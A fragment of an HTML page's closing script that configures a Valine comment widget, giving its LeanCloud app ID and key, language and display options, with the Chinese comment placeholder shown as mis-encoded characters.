      notify     : true,
      appId      : 'YVmWHQrHLOAW7ewgX1jprtQl-gzGzoHsz',
      appKey     : 'dY6y287UlOydRGZnN74I8XyY',
      placeholder: "è¾“å…¥ä½ çš„è¯„è®º\\næ˜µç§°ä¸ºå¿…å¡«é¡¹ç›®",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '3' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
